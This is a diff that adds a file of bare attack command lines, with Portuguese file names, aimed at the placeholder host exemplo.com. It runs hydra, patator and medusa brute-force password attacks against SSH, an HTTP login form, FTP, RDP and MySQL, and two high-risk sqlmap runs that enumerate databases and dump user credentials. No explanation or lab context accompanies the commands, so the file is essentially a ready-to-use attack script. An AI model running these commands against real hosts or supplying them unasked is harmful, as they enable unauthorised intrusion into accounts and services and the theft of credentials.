@@ -1,0 +1,47 @@
+hydra -L usuarios.txt -P senhas.txt ssh://exemplo.com -vV -o resultado_ssh.txt
+
+
+
+
+
+hydra -l admin -P senhas.txt exemplo.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Senha incorreta" -vV -o resultado_http.txt
+
+
+
+
+
+
+patator ftp_login host=exemplo.com user=FILE0 password=FILE1 0=usuarios.txt 1=senhas.txt -x ignore:mesg='Login incorrect.' -l resultado_ftp
+
+
+
+
+
+medusa -h exemplo.com -U usuarios.txt -P senhas.txt -M rdp -n 3389 -f -O resultado_rdp.txt
+
+
+
+
+
+
+
+patator mysql_login host=exemplo.com user=root password=FILE0 0=senhas.txt -x ignore:mesg='Access denied'
+
+
+
+
+
+
+sqlmap -u "http://exemplo.com/login.php?user=admin&pass=123" --level=5 --risk=3 --dbs --batch --output-dir=resultado_sqlmap
+
+
+
+
+
+sqlmap -u "http://exemplo.com/login.php" --data="user=admin&pass=*" --users --passwords --output-dir=credenciais_sql
+
+
+
+
+
+medusa -h exemplo.com -U usuarios.txt -P senhas.txt -M ssh -n 22 -T 10 -O resultado_medusa.txt
